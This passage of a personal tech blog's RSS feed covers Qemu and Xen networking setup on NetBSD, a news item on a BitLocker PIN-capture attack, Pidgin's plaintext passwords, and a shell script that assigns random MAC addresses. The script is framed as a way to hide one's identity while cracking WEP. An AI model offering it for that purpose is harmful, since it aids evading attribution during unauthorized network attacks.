      <content:encoded><![CDATA[<p>In this tutorial I&rsquo;d like to give you some useful examples how to configure network when using Qemu as virtualization machine. The videos in this HowTo were taken on a NetBSD-5_STABLE/amd64 machine usingÂ  Qemu 0.11.1. **Attention: **On my system I&rsquo;ve used a patched version of Qemu as reported <a href="http://mail-index.netbsd.org/pkgsrc-bugs/2009/12/18/msg035190.html">here</a>. However you can use the <code>fd=</code> option to specify an open socket to be used. Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ qemu -cdrom [iso file] -net nic -net tap,fd=3 3&lt;&gt;/dev/tap0
</code></pre></div><p>Using this example `tap0â€³ should be created before the qemu command. The shown examples might work on other platforms too. Be sure to have TUN/TAP device support built-in and the Qemu suite installed. Check out <strong>References</strong> for further information.</p>
<h2 id="usermode-network-stack">Usermode network stack</h2>
<p>Probably the simplest method of connecting your host and the guest system. In this mode Qemu will create a :</p>
<ul>
<li>virtual network (10.0.2.0)</li>
<li>fiirewall which doesn&rsquo;t allow any external connections</li>
<li>DHCP-Server (10.0.2.2)</li>
<li>gateway (10.0.2.2)</li>
</ul>
<p>The DHCP-Server will automatically assign 10.0.2.15 to your interface when a DHCP-request was sent. When the host system is connected to the Internet, the guest will be automatically be able to access the Internet too. No additional steps are required.</p>
<ol>
<li>[ host system ] Launch Qemu process:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ qemu -net nic -net user -cdrom [iso file]
</code></pre></div><ol start="2">
<li>[ guest system] Get an IP address:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dhclient [interface]
</code></pre></div><ol start="3">
<li>[ guest system] Check settings and Internet connectivity:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig [interface]
$ ftp [ftp site]
</code></pre></div><p>On my system the firewall was blocking any ICMP packets so ping might not work. But don&rsquo;t get disoriented (like I did). Try to ssh or ftp any known host to check the connection.</p>
<h2 id="connecting-vlans">Connecting VLANs</h2>
<p>This is a quite simple step. You&rsquo;ll have to set up a Qemu process listening for incoming connection(s) onÂ  a certain socket. The second Qemu process will connect to the listening socket. Whenever a frame/packet appears on the VLAN of the first Qemu process, it will be forwarded to the second one and <span style="font-style: italic;">vice versa</span>.</p>
<p>Here&rsquo;s our configuration:</p>
<ul>
<li>Guest <strong>A</strong>: listen for connections on <code>localhost:8010</code></li>
<li>Guest <strong>B</strong>: connect to Guest <strong>A</strong> through <code>localhost:8010</code></li>
</ul>
<p>Host <strong>A</strong> will listen for incomming connections on port 8010 and host <strong>B</strong> will be configured to connect to host <strong>A</strong>.</p>
<h3 id="create-host-a">Create host A</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ qemu  -net nic,macaddr=52:54:00:12:34:57 -net socket,listen=:8010  
      -cdrom [iso file]
</code></pre></div><h3 id="create-host-b">Create host B</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ qemu  -net nic,vlan=2,macaddr=52:54:00:12:34:56 
      -net socket,vlan=2,connect=127.0.0.1:8010 
      -cdrom [iso file]
</code></pre></div><h3 id="configure-host-a">Configure host A</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig [interface] 10.0.2.100 netmask 255.255.255.0 up
</code></pre></div><h3 id="configure-host-b">Configure host B</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig [interface] 10.0.2.101 netmask 255.255.255.0 up
</code></pre></div><p>Using this configuration you should be able to access host <strong>B</strong> from host <strong>A</strong> and vice versa.</p>
<h2 id="connecting-vlans-to-tap-device-1-host">Connecting VLANs to TAP device (1 host)</h2>
<p>There is another option to create VLANs: Using a virtual Ethernet device (tap device). Any frames transmitted through this device will also appear on the VLAN of your guest OS. Of course any frames sent to guest&rsquo;s VLAN will be also received by the TAP device.</p>
<p>Using the kernel TAP/TUN device driver applications are allowed to interact with a network device using a simple file descriptor. Any data sent over the file descriptor will be received on both sides. That means that applications running on the guest system(s) will be able to access and connect to applications running on the host system. If port forwarding is allowed, guest applications can also access the Internet.</p>
<p>First we create a TAP device:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig tap0 create
$ ifconfig tap0
tap0: flags=8802  mtu 1500
Â Â Â Â Â Â Â  address: f2:0b:a4:86:42:08
Â Â Â Â Â Â Â  media: Ethernet autoselect
$ ifconfig tap0 10.0.2.100 netmask 255.255.255.0 up
</code></pre></div><h3 id="launch-qemu-process">Launch Qemu process:</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ qemu -net nic,vlan=0 -net tap,vlan=0,ifname=tap0 -cdrom  [iso file]
</code></pre></div><h3 id="configure-virtual-host">Configure virtual host:</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig [interface] 10.0.2.101 netmask 255.255.255.0 up
</code></pre></div><p>You should now be able to access your Qemu host from your guest host (ping 10.0.2.101). 10.0.100 (guest system) should be also accessible from your Qemu process.</p>
<h2 id="connecting-vlans-to-tap-devices-2-hosts">Connecting VLANs to TAP devices (2 hosts)</h2>
<p>In this example we&rsquo;ll have 2 guests (= 2 TAP devices). Each guest is connected to the host system by a TAP device. In order to allow inter-connectivity the gust system should have a bridge between both TAP devices. The bridge will act as a central network node between the guest and both virtual hosts. For Internet access IP forwarding should be enabled (disabled by default). First we&rsquo;ll have to create the TAP devices:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig tap0 create
$ ifconfig tap1 create
$ ifconfig tap0
tap0: flags=8802 mtu 1500
        address: f2:0b:a4:86:42:08
        media: Ethernet autoselect
$ ifconfig tap1
tap1: flags=8802 mtu 1500
        address: f2:0b:a4:86:61:01
        media: Ethernet autoselect
</code></pre></div><h3 id="launch-guest-a">Launch guest A</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ qemu  -net nic,macaddr=52:54:00:12:34:56 -net tap,ifname=tap0 -cdrom [iso file]
</code></pre></div><h3 id="launch-guest-b">Launch guest B</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"> $ qemu  -net nic,macaddr=52:54:00:12:34:57 -net tap,ifname=tap1 -cdrom [iso file]
</code></pre></div><h3 id="setup-tap-devices-networking-settings">Setup TAP devices networking settings:</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig tap0 10.0.2.100 netmask 255.255.255.0 up
$ ifconfig tap1 10.0.3.100 netmask 255.255.255.0 up
</code></pre></div><h3 id="create-bridge-interface">Create bridge interface:</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig bridge0 create
$ brconfig bridge0 add tap0 add tap1 up
</code></pre></div><h3 id="setup-network-settings-for-guest-a">Setup network settings for guest A</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig [interface] 10.0.2.101 netmask 255.255.0.0 up
</code></pre></div><h3 id="setup-network-settings-for-guest-b">Setup network settings for guest B</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig [interface] 10.0.3.101 netmask 255.255.0.0 up
</code></pre></div><p>Now try following:</p>
<ol>
<li>From your host system: ping 10.0.2.101; ping 10.0.3.101</li>
<li>From guest A: ping 10.0.2.100; ping 10.0.3.101; ping 10.0.3.100</li>
<li>From guest B: ping 10.0.3.101; ping 10.0.2.101; ping 10.0.2.100</li>
</ol>
<p>For Internet access the guest system should be connected to the Internet and allow IP forwarding:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sysctl -w net.inet.ip.forwarding=1
</code></pre></div><p>In all cases you should be able to ping/access any system no matter what system you operate on.Â </p>
<h2 id="references">References</h2>
<p>a) <a href="http://wiki.qemu.org/Main_Page">http://wiki.qemu.org/Main_Page</a></p>
<p>b)<a href="http://qemu-buch.de/de/index.php/QEMU-KVM-Buch/_Netzwerkoptionen/_Virtuelle_Netzwerke_konfigurieren"> http://qemu-buch.de/de/index.php/QEMU-KVM-Buch/_Netzwerkoptionen/_Virtuelle_Netzwerke_konfigurieren</a></p>
<p>c) <a href="http://compsoc.dur.ac.uk/%7Edjw/qemu.html">http://compsoc.dur.ac.uk/~djw/qemu.html</a></p>
<p>d) <a href="http://people.gnome.org/%7Emarkmc/qemu-networking.html">http://people.gnome.org/~markmc/qemu-networking.html</a></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Attacking Trusted Platform Module (TPM)</title>
      <link>https://blog.dornea.nu/2009/12/05/attacking-trusted-platform-module-tpm/</link>
      <pubDate>Sat, 05 Dec 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/12/05/attacking-trusted-platform-module-tpm/</guid>
      <content:encoded><![CDATA[<p>For those of who believe that using authenticated boot features such as TPM should protect you against hackers&hellip; : WRONG! In their latest project some guys from Frauenhofer SIT (Security Test Lab) have managed to conduct a quite realistic attack against a Windows machine with BitLocker, the disk encryption functionality in most recent Windows versions. As stated <a href="http://testlab.sit.fraunhofer.de/content/output/project_results/bitlocker_skimming/">here</a> there is a video which demonstrates a proof-of-concept implementation of such an attack. Using a fake boot screen which was previously installed in the MBR, the attacker can spoof the user interaction of BitLocker and obtain the secret key (PIN) from the user, write this to disk and reboot the machine. Afterwards the original boot screen is reinstalled and the user doesnt have a clue what happened. So do NOT leave your laptop unattended whereever you are! View full video <a href="http://testlab.sit.fraunhofer.de/content/output/project_results/bitlocker_skimming/bitlockervideo.php?s=2">here</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Pidgin stores account data in plaintext!</title>
      <link>https://blog.dornea.nu/2009/11/23/pidgin-stores-account-data-in-plaintext/</link>
      <pubDate>Mon, 23 Nov 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/11/23/pidgin-stores-account-data-in-plaintext/</guid>
      <content:encoded><![CDATA[<p>I was just looking for some configuration files in Pidgins working directory <code>~/.purple/</code> and found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">...
-rw------- 1 victor users  22939 Nov 23 19:34 accounts.xml
...
</code></pre></div><p>Well I wouldn&rsquo;t have payed to much attention at that file, if it had not contained this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ head accounts.xml 
&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39; ?&gt;

&lt;account version=&#39;1.0&#39;&gt;
        &lt;account&gt;
                &lt;protocol&gt;prpl-msn&lt;/protocol&gt;
                &lt;name&gt;******@hotmail.de&lt;/name&gt;
                &lt;password&gt;**&lt;/password&gt;
                &lt;alias&gt;v****&lt;/alias&gt;
                &lt;statuses&gt;
                         
...
</code></pre></div><p>Plaintext passwords? I couldn&rsquo;t believe it. So I searched on Pidgins Wiki site for some entries justifing this (in)secure measurement. And indeed I found one: <a href="http://developer.pidgin.im/wiki/PlainTextPasswords">http://developer.pidgin.im/wiki/PlainTextPasswords</a>. However&hellip; Could somebody tell me what they mean by this one:</p>
<blockquote>
<p>&ldquo;We&rsquo;re 100% fine with people having false perceptions of how insecurely Pidgin handles your passwords. We are not, however, fine with sacrificing actual security for false security. We&rsquo;re 100% fine with people having false perceptions of how insecurely. Pidgin handles your passwords. We are not, however, fine with sacrificing actual security for false security.&rdquo;</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>NetBSD, Linux, Xen - Does it work?</title>
      <link>https://blog.dornea.nu/2009/11/14/netbsd-linux-xen-does-it-work/</link>
      <pubDate>Sat, 14 Nov 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/11/14/netbsd-linux-xen-does-it-work/</guid>
      <content:encoded><![CDATA[<p>In this article I&rsquo;d like to share my impressions I made with Xen during the last weeks. I met Xen a few months ago but due to general lack of interest I didn&rsquo;t have the chance to give it a try.Para-virtualization - why bother at all? There were actually no significant reasons why I should use virtualization. But then it started with this <a href="http://mail-index.netbsd.org/tech-net/2009/07/21/msg001509.html">thread,</a> followed by this <a href="http://mail-index.netbsd.org/netbsd-users/2009/10/13/msg004692.html">one</a>. The really fascinating - and tough quite useful - aspect of virtualization consists of the hardware access policy which is implemented by the virtualization host. Guests (virtualized operating systems) may access specific devices like hard disks, PCI cards etc. The host system - in our case Xen&rsquo;s domain-0 - can grant <code>guests</code> access to physical hardware. Xen comes up with a great feature which allows you to pass a PCI device trough to an unprivileged domain. Once you pass the PCI device (as boot parameter) to Xen&rsquo;s hypervisor you won&rsquo;t be able to use it within your domain-0 (dom0). A dummy driver stops the dom0 from accessing the device. If everything went well, you should be able to see the device on your domU (unprivileged). That&rsquo;s the idea so far&hellip;</p>
<p>I have tried many scenarios: NetBSD-CURRENT / {Xen3 ,Xen3.3}, NetBSD 5.0.1 / {Xen3, Xen3.3} and finally NetBSD 5.0_STABLE / {Xen3, Xen3.3}. The last combination worked devianatfine for me. NetBSD 5.0.1 had some problems during boot process so I decided to use a stable version which finally worked. If you tend to use Xen 3 (not Xen 3.3) be aware to use the vmlinux and NOT the compressed vmlinuz image. Otherwise you&rsquo;ll get something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ xm create -c linux
Using config file &#34;/usr/pkg/etc/xen/linux&#34;.
Error: (2, &#39;Invalid kernel&#39;, &#39;xc_dom_find_loader: no loader found
&#39;)
</code></pre></div><p>Whatever kernel you may specify be sure its an ELF binary (ELF 64-bit LSB executable, x86-64, version 1 (SYSV) in my case). You should find a <code>vmlinux</code> file in the kernel source directory (usually /usr/src). Be sure you use this file as your domU kernel and don&rsquo;t forget to create a ramdisk image as this is required by Xen. I won&rsquo;t waste my time helping you how to configure your domU and how to setup Xen + Xen tools. There are a lot of tutorials and (good) papers related to this issue. Feel free to invest some time in understanding Xen and the virtualization system. Perhaps I should mention that Xen 3.3 has a better kernel image support than Xen 3. You should be able to specify a compressed kernel image (bzImage) in your domU configuration without any problems. You should however - therefor I&rsquo;d like to thank #xen on Freenode for their great support - use a kernel image &gt;= 2.6.26 (correct me if I&rsquo;m wrong ?!). Debian Lenny provides vmlinuz-2.6.30 so you should be fine with that. At the moment there is no pciback support for Xen 3.3. As told <a href="http://mail-index.netbsd.org/port-xen/2009/10/26/msg005500.html">here</a> someone with python knowledge has to port pkgsrc/sysutils/xentools3/patches/{patch-dm,patch-dn} to xentools33. Although I had some good intensions and took a look at the files that have to be modified, I quickly gave it up due to its complexity. Maybe someone else - with more spare time - could commit some changes. Xen 3.3 needs pciback and I need pciback support on NetBSD. Back to Xen 3 &hellip; So I was able to pass some PCI device to my domU. Well not really, at least not using my own kernel. I had this configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kernel = &#34;/vmlinuz-2.6.18-xen&#34;
ramdisk = &#34;/initrd.img-2.6.30&#34;
memory = 156
name = &#34;debian&#34;
disk = [ &#39;phy:/dev/wd0g,xvda,w&#39; ]
</code></pre></div><p>And got this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dmesg | grep -e pci -e PCI
PCI: setting up Xen PCI frontend stub
PCI: System does not support PCI
PCI: System does not support PCI
pcifront pci-0: Installing PCI frontend
pcifront pci-0: Creating PCI Frontend Bus 0000:03
$ lspci
03:00.0 Network controller: Intel Corporation PRO/Wireless 4965 AG or AGN [Kedron] Network Connection (rev 61)
</code></pre></div><p>Since wmlinuz-2.6.18-xen doesn&rsquo;t have built-in driver support for my WLAN card, I had to use some different kernel (2.6.30). Then I sould theoretically be able to use my PCI device. Well things turned up to be a little be different as expected:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kernel = &#34;/vmlinux-2.6.30&#34;
ramdisk = &#34;/initrd.img-2.6.30&#34;
memory = 156
name = &#34;debian&#34;
disk = [ &#39;phy:/dev/wd0g,xvda,w&#39; ]
vif = [ &#39;bridge=bridge0&#39;  ]
root = &#34;/dev/xvda&#34;
pci = [ &#39;0000:03:00.0&#39;]
#extra = &#34;xencons=tty1&#34;
extra = &#34;1&#34;
</code></pre></div><p><code>dmesg</code> told me:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dmesg | grep -e &#34;PCI&#34; -e &#34;pci&#34;
[    0.000000] Allocating PCI resources starting at 10000000 (gap:9c00000:f6400000)
[    0.005111] PCI: Fatal: No config space access function found
[    0.012608] PCI: System does not support PCI
[    0.012615] PCI: System does not support PCI
[    0.051897] pci_hotplug: PCI Hot Plug PCI Core version: 0.5
[    0.052676] pciehp: PCI Express Hot Plug Controller Driver version: 0.4
[    0.052683] acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5
[    0.052696] cpcihp_zt5550: ZT5550 CompactPCI Hot Plug Driver version: 0.2
[    0.052702] cpcihp_generic: Generic port I/O CompactPCI Hot Plug Driver version: 0.1
[    0.052709] cpcihp_generic: not configured, disabling.
[    0.052761] shpchp: Standard Hot Plug PCI Controller Driver version: 0.4
[    0.164017] XENBUS: Device with no driver: device/pci/0
</code></pre></div><p>&hellip; and <code>lspci</code> told me nothing:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ lspci
$
</code></pre></div><p>What went wrong? Did I miss something in the kernel configuration file? As you see there is a lot of work to do. I suppose there are no such problems under Linux (as dom0). Again: Correct me if I&rsquo;m wrong! I really appreciate NetBSDs Xen support on this <a href="http://www.netbsd.org/mailinglists/#port-xen">mailing list</a> as it provides precious information you might find helpful - like I did. Nevertheless we sholuld push up the whole porting process so we can have a 100% functionable Xen integration in NetBSD. If you got some ideas that might solve my problem (in particular) don&rsquo;t esitate to contact me. Or even better: Write a mail to the mailing list. The whole discussion can be followed on NetBSD&rsquo;s mailing list <a href="http://mail-index.netbsd.org/port-xen/2009/10/23/msg005478.html">port-xen</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Simple MAC address generator</title>
      <link>https://blog.dornea.nu/2009/10/14/simple-mac-address-generator/</link>
      <pubDate>Wed, 14 Oct 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/10/14/simple-mac-address-generator/</guid>
      <content:encoded><![CDATA[<p>Any time you do some <strong>security researches</strong> you should better spoof/hide your identity. The best way to do that is to spoof/manipulate the MAC address of your interface. I normally do that when doing WiFi stuff: WEP cracking and such stuff. I usually assign some random MAC address to my interfaces to fully hide my identity.</p>
<p>A MAC address consists of six groups of hexadecimal digits. Each group is separated by hyphens or colons. Each group consists of 256 possible permutations, e.g. A1, 1F, C3 etc. Since we have 6 groups, youâ€™ll get 256^6 = 2^48 = 281,474,976,710,656 possible MAC addresses.</p>
<p>I wrote a simple sh (not bash) script which generates MAC addresses using shuffle (you may want to use another randomizing command available on your system). If no arguments are given the script will print out the generated MAC. You can call the script with an additional parameter which should be an existant network interface. In that case the script (you&rsquo;ll need r00t rights) will assign that MAC to the interface.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#999;font-style:italic">#    MACgen - simple MAC address generator</span>
<span style="color:#999;font-style:italic">#    Copyright (C) 2009 by Victor Dorneanu</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic">#    This program is free software: you can redistribute it and/or modify</span>
<span style="color:#999;font-style:italic">#    it under the terms of the GNU General Public License as published by</span>
<span style="color:#999;font-style:italic">#    the Free Software Foundation, either version 3 of the License, or</span>
<span style="color:#999;font-style:italic">#    (at your option) any later version.</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic">#    This program is distributed in the hope that it will be useful,</span>
<span style="color:#999;font-style:italic">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style="color:#999;font-style:italic">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style="color:#999;font-style:italic">#    GNU General Public License for more details.</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic">#    You should have received a copy of the GNU General Public License</span>
<span style="color:#999;font-style:italic">#    along with this program.  If not, see .</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic">#    Mail: victor[__at__]dornea.nu</span>
<span style="color:#999;font-style:italic">#    Site: http://dornea.nu</span>
<span style="color:#999;font-style:italic">#    ----------------------</span>
<span style="color:#999;font-style:italic"># </span>
<span style="color:#999;font-style:italic">#    USAGE: MACgen.sh [interface]</span>
<span style="color:#999;font-style:italic">#           If &#34;interface&#34; exists, then the newly generated MAC address will</span>
<span style="color:#999;font-style:italic">#           be assigned to the given interface. Otherwise the script will just</span>
<span style="color:#999;font-style:italic">#           print out the MAC address.</span>
<span style="color:#999;font-style:italic">#</span>

<span style="color:#999;font-style:italic"># Define here randomizing shell command</span>
<span style="color:#40ffff">SHUFFLE</span>=<span style="color:#ed9d13">`</span>which shuffle<span style="color:#ed9d13">`</span>
<span style="color:#40ffff">SHUFFLE_OPTS</span>=<span style="color:#ed9d13">&#39;-p 1&#39;</span>

<span style="color:#999;font-style:italic"># List of available characters</span>
<span style="color:#40ffff">list</span>=<span style="color:#ed9d13">&#34;0 1 2 3 4 5 6 7 8 9 A B C D E F&#34;</span>

<span style="color:#999;font-style:italic"># How many characters does a MAC address consist of?</span>
<span style="color:#40ffff">mac_size</span>=<span style="color:#3677a9">12</span>

<span style="color:#999;font-style:italic"># Our random MAC address</span>
<span style="color:#40ffff">generated_mac</span>=<span style="color:#ed9d13">&#34;&#34;</span>

generate_mac()
{
   <span style="color:#999;font-style:italic"># Some internal variable (used for the dots &#34;:&#34;)</span>
   <span style="color:#40ffff">c</span>=<span style="color:#3677a9">2</span>

   <span style="color:#999;font-style:italic"># Permutate list of available characters</span>
   <span style="color:#6ab825;font-weight:bold">while</span> <span style="color:#24909d">true</span> 
   <span style="color:#6ab825;font-weight:bold">do</span>
      <span style="color:#999;font-style:italic"># Loop break condition</span>
      <span style="color:#6ab825;font-weight:bold">if</span> [ <span style="color:#40ffff">$mac_size</span> = <span style="color:#3677a9">0</span> ]; <span style="color:#6ab825;font-weight:bold">then</span> <span style="color:#24909d">break</span> 
      <span style="color:#6ab825;font-weight:bold">fi</span>

      <span style="color:#6ab825;font-weight:bold">if</span> [ <span style="color:#40ffff">$c</span> = <span style="color:#3677a9">0</span> ]; <span style="color:#6ab825;font-weight:bold">then</span>
         <span style="color:#40ffff">generated_mac</span>=<span style="color:#40ffff">$generated_mac</span>:<span style="color:#ed9d13">`</span><span style="color:#40ffff">$SHUFFLE</span> <span style="color:#40ffff">$SHUFFLE_OPTS</span> <span style="color:#40ffff">$list</span><span style="color:#ed9d13">`</span>
         <span style="color:#40ffff">c</span>=<span style="color:#3677a9">2</span>
      <span style="color:#6ab825;font-weight:bold">else</span>
         <span style="color:#40ffff">generated_mac</span>=<span style="color:#40ffff">$generated_mac</span><span style="color:#ed9d13">`</span><span style="color:#40ffff">$SHUFFLE</span> <span style="color:#40ffff">$SHUFFLE_OPTS</span> <span style="color:#40ffff">$list</span><span style="color:#ed9d13">`</span>
      <span style="color:#6ab825;font-weight:bold">fi</span>

      <span style="color:#40ffff">mac_size</span>=<span style="color:#6ab825;font-weight:bold">$((</span>mac_size-1<span style="color:#6ab825;font-weight:bold">))</span>
      <span style="color:#40ffff">c</span>=<span style="color:#6ab825;font-weight:bold">$((</span>c-1<span style="color:#6ab825;font-weight:bold">))</span>
   <span style="color:#6ab825;font-weight:bold">done</span>
}

<span style="color:#999;font-style:italic"># Check if interface argument was supplied</span>
<span style="color:#6ab825;font-weight:bold">if</span> [ -z <span style="color:#40ffff">$1</span> ]; <span style="color:#6ab825;font-weight:bold">then</span>
   generate_mac
   <span style="color:#24909d">echo</span> <span style="color:#40ffff">$generated_mac</span>

<span style="color:#999;font-style:italic"># Assign MAC to interface</span>
<span style="color:#6ab825;font-weight:bold">else</span>
    generate_mac
   <span style="color:#ed9d13">`</span>which ifconfig<span style="color:#ed9d13">`</span> <span style="color:#40ffff">$1</span> link <span style="color:#40ffff">$generated_mac</span> active
    <span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;New MAC address for </span><span style="color:#40ffff">$1</span><span style="color:#ed9d13">: </span><span style="color:#40ffff">$generated_mac</span><span style="color:#ed9d13">&#34;</span>
<span style="color:#6ab825;font-weight:bold">fi</span>
</code></pre></div><p>Feel free to change the script and adapt it to your needs. Some examples:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@BlackTiny:~]$ MACgen.sh 
60:17:E8:1C:FF:7C
[root@BlackTiny:~]$ MACgen.sh
AE:7C:B6:CE:8B:7A
[root@BlackTiny:~]$ MACgen.sh
FB:D9:AB:D8:01:61
[root@BlackTiny:~]$ MACgen.sh
D8:F8:67:EF:BF:06
[root@BlackTiny:~]$ MACgen.sh ath0
New MAC address for ath0: BD:50:D4:CB:FA:F2
[root@BlackTiny:~]$ ifconfig ath0
ath0: flags=8802 mtu 1500
        ssid &#34;&#34;
        powersave off
        address: bd:50:d4:cb:fa:f2
        media: IEEE802.11 autoselect
        status: no network&lt;/pre&gt;

</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Some Drupal peculiarities</title>
      <link>https://blog.dornea.nu/2009/09/15/some-drupal-peculiarities/</link>
      <pubDate>Tue, 15 Sep 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/09/15/some-drupal-peculiarities/</guid>
      <content:encoded><![CDATA[<p>Add Lightbox2 functionalities to WYSIWYG editor TinyMCE - who thought this would cost me about 6 hours of work? In fact that was the easiest part: I just followed the instructions on <a href="http://drupal.org/node/252153">http://drupal.org/node/252153</a> and everything worked well! Before being able to do that, some upgrades were necessary. On <a href="http://drupal.org/project/tinymce">http://drupal.org/project/tinymce</a> I was told that the module was deprecated and replaced by the <a href="http://drupal.org/project/wysiwyg">Wysiwyg API</a>. So I had to remove the old TinyMCE module, install the new one and add at least one editor library as described on <a href="http://drupal.org/node/371459">http://drupal.org/node/371459</a>. The installation went <strong>almost</strong> fine. I was able to create a new WYSIWYG profile and adjust settings on <em>admin/settings/wysiwyg/profile</em>. Then I was curios enought to test it using <em>node/add/articles</em>. Nothing happened&hellip; No TinyMCE&hellip; No WYS*&amp;%SHIT!</p>
<p>So what went wrong? You won&rsquo;t believe me! The main cause was a missing:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php print $closure; &gt;
